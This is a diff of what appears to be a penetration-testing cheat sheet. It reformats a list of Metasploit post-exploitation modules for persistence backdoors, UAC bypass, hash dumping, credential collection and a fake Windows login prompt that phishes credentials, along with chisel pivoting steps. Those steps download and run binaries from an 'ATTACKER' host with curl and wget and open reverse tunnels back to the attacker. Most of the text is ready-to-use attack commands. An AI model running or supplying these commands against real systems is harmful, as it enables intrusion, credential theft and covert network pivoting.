@@ -471,37 +471,96 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 run persistence -S -U -X -p 443 -r tun0 -P windows/x64/meterpreter/bind_tcp -A
 run persistence -S -U -X -p 4343 -r tun0 -P windows/x64/meterpreter/reverse_tcp -A
 
-# Other post exploitation modules
-run winenum			                                                   --->   enum all windows services via meterpreter session 
-use exploit/windows/local/persistence                                            ---> maintining access via a backdoor , setup persistent shell via meterpreter and metasploit
-run arp_scanner –r 10.32.120.0/2                                                 -> run arp scan to map network via meterpreter 
-run autoroute -s                                                                 --> set the route to an internal network with the following command via meterpreter
-use sniffer | sniffer_interfaces | sniffer_start | sniffer_dump | sniffer_stop  -->   perform sniffing on network and try to detect any active devices for pivoting
-use post/multi/recon/local_exploit_suggester                                     ---> scans a system for local vulnerabilities contained in Metasploit. It then makes suggestions for exploiting
-run post/windows/gather/enum_patches                                            --> show patches that have not been installed for exploiting
-run post/windows/gather/enum_computers                                          ---> display all machines in the network
-run post/windows/gather/win_privs                                               --> display all the privileges that we have plus some other information about the system
-post/windows/gather/arp_scanner                                                 --> to run arp scanner on networks
-use auxiliary/scanner/portscan/tcp                                              --> to scan for open ports 
-use exploit/windows/local/bypassuac                                            --> bypass uac to obtain admin access 
-use exploit/windows/local/current_user_psexec                                    --> module uploads executable file to victim,creates share containing file, creates remote service on each target using UNC path to file, and  starts the service
-post/windows/gather/enum_applications                                          --> eunmerate services running
-post/windows/gather/hashdump                                                   -- > dump windows hashes 
-post/windows/gather/smart_hashdump                                             -- > smart dump hashes 
-post/windows/manage/migrate                                                    ---> migrate to another service
-post/windows/gather/credentials/credential_collector                           --> gather other credentials 
-post/windows/gather/credentials/sso                                            --> This module will collect clear text Single Sign-On credentials from the Local Security Authority
-post/windows/gather/phish_windows_credentials                                  --> perform a phishing attack on target by popping up a login prompt. When user enters creds in the prompt, they will be sent to attacker
-post/windows/gather/enum_logged_on_user                                        --> enums users
-post/windows/gather/enum_computers                                             --> enums machines
-post/windows/gather/enum_shares                                                --> enums shares
-post/windows/gather/enum_snmp                                                  ---> enums snmp
-use exploit/windows/local/service_permissions		                         -->  attempts to find weak permissions in existing services and adds a service if possible for priv escalation
-use exploit/windows/local/unquoted_service_path				 --> checks if an attacker is able to place a malicious executable in unexpected paths, technique was previously called Trusted Service Path		
-use windows/manage/run_as                                                      --> module to execute our payload as a specific user, for example; if you have creds for AD user, you can execute command as that user to privEsc 
-use exploit/linux/samba/trans2open                                             --->  samba exploit for linux
+## Post exploitation Metasploit modules
+
+#  enum all windows services via meterpreter session  	
+run winenum	
+	
+# maintining access via a backdoor , setup persistent shell via meterpreter and metasploit	
+use exploit/windows/local/persistence                                           
+
+# run arp scan to map network via meterpreter 	
+run arp_scanner –r 10.32.120.0/2                                               
+	
+# set the route to an internal network with the following command via meterpreter 	
+run autoroute -s                                                                 
+
+#  perform sniffing on network and try to detect any active devices for pivoting	
+use sniffer | sniffer_interfaces | sniffer_start | sniffer_dump | sniffer_stop  
+
+#  scans a system for local vulnerabilities contained in Metasploit. It then makes suggestions for exploiting	
+use post/multi/recon/local_exploit_suggester                                    
+
+# show patches that have not been installed for exploiting	
+run post/windows/gather/enum_patches          
+	
+# display all machines in the network	
+run post/windows/gather/enum_computers                                          
+
+#  display all the privileges that we have plus some other information about the system	
+run post/windows/gather/win_privs                                              
+	
+#  display all the privileges that we have plus some other information about the system	
+post/windows/gather/arp_scanner                                                
+	
+# scan for open tcp ports	
+use auxiliary/scanner/portscan/tcp    
+	
+# bypass uac to obtain admin access	
+use exploit/windows/local/bypassuac                                          
+	
+# module uploads executable file to victim,creates share containing file, creates remote service on each target using UNC path to file, and  starts the service	
+use exploit/windows/local/current_user_psexec                                   
+	
+#  eunmerate services running	
+post/windows/gather/enum_applications                                          
+	
+# dump windows hashes 	
+post/windows/gather/hashdump
+	
+# smart dump hashes 	
+post/windows/gather/smart_hashdump   
+	
+# migrate to another service	
+post/windows/manage/migrate                                                   
+	
+# gather other credentials 	
+post/windows/gather/credentials/credential_collector                           
+
+# This module will collect clear text Single Sign-On credentials from the Local Security Authority	
+post/windows/gather/credentials/sso                                           
+
+# perform a phishing attack on target by popping up a login prompt. When user enters creds in the prompt, they will be sent to attacker	
+post/windows/gather/phish_windows_credentials                                  
+	
+# enums logged om users	
+post/windows/gather/enum_logged_on_user   
+	
+# enums machines	
+post/windows/gather/enum_computers                                          
+
+#  enums shares	
+post/windows/gather/enum_shares                                               
+	
+# enums snmp 	
+post/windows/gather/enum_snmp    
+	
+# attempts to find weak permissions in existing services and adds a service if possible for priv escalation	 
+use exploit/windows/local/service_permissions		                        
+	
+# checks if an attacker is able to place a malicious executable in unexpected paths, technique was previously called Trusted Service Path			
+use exploit/windows/local/unquoted_service_path				 
+	
+# module to execute our payload as a specific user, for example; if you have creds for AD user, you can execute command as that user to privEsc 	
+use windows/manage/run_as                                                    
+
+# samba exploit for linux targets
+use exploit/linux/samba/trans2open                                            
+
+# dump domain hashes	
 use windows/gather/credentials/domain_hashdump
-run post/windows/gather/enum_logged_on_users
+
+# upgrade non-meterpreter shell to a mmeterpreter shell
 use post/multi/manage/shell_to_meterpreter
  
 
@@ -1212,36 +1271,36 @@ wget -q http://10.9.0.17/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat ex
 2. ./chisel server -p 1338 --reverse
 3. ./chisel client ATTACKER_IP:1338 R:socks
 
-1. (on target) 
-2. (as attacker)  start chisel in server mode on our Kali host, and listening on a port that is open for outbound connections in the target firewall
-3. (on target)    despite connecting back to port 1337, the actual proxy has been opened on 127.0.0.1:1080. We will be using port 1080 when sending data through the proxy 
+Line 1. (on target) 
+Line 2. (as attacker)  start chisel in server mode on our Kali host, and listening on a port that is open for outbound connections in the target firewall
+Line 3. (on target)    despite connecting back to port 1337, the actual proxy has been opened on 127.0.0.1:1080. We will be using port 1080 when sending data through the proxy 
 
 # forward SOCKS proxy with chisel on linux target for bind shells ( must setup socks5 proxy in proxychains on port 1080)
 1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
 2. /chisel server -p LISTEN_PORT --socks5
 3. ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
 
-1. (on target)
-2. (on target)
-3. (as attacker)  In this command, PROXY_PORT is the port that will be opened for the proxy. For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine. 
+Line 1. (on target)
+Line 2. (on target)
+Line 3. (as attacker)  In this command, PROXY_PORT is the port that will be opened for the proxy. For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine. 
 
 # Local Port Forward with chisel
 1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
 2. ./chisel server -p LISTEN_PORT
 3. ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
 
-1. (on target)
-2. (as attacker)
-3. (on target)  As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target. For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to  access  172.16.0.10:22 (our intended target on port 22), we could use: ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+Line 1. (on target)
+Line 2. (as attacker)
+Line 3. (on target)  As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target. For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to  access  172.16.0.10:22 (our intended target on port 22), we could use: ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
 
 # remote Port Forward with chisel 
 1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
 2. ./chisel server -p LISTEN_PORT --reverse
 3. ./chisel client ATTACKING_IP:LISTEN_PORT R:OUR_LOCAL_PORT:TARGET_IP:TARGET_PORT 
 
-1. (on target)
-2. (as attacker)
-3. (on target)  You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the  target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.  To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows: ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22.  Connecting back to our attacking machine, functioning as a chisel server started with: ./chisel server -p 1337 --reverse. This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222 on our attacker machine.     
+Line 1. (on target)
+Line 2. (as attacker)
+Line 3. (on target)  You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the  target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.  To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows: ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22.  Connecting back to our attacking machine, functioning as a chisel server started with: ./chisel server -p 1337 --reverse. This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222 on our attacker machine.     
 
 
 ## sshuttle
@@ -1342,10 +1401,10 @@ ssh -t alex@10.10.150.157 /bin/bash --norc --noprofile
 
 
 # transfer a binary via base64 
-base64 binary 													(on target machine)
+base64 binary 								(on target machine)
 mkdir transfer_files; cd transfer_files; nano binary			(on attacker machine)
 copy and paste base64 output to binary					(on attacker machine)
-base64 -d binary > transfer_files/binary 					(on attacker machine)
+base64 -d binary > transfer_files/binary 				(on attacker machine)
 
 
 # rev bash shell one liner
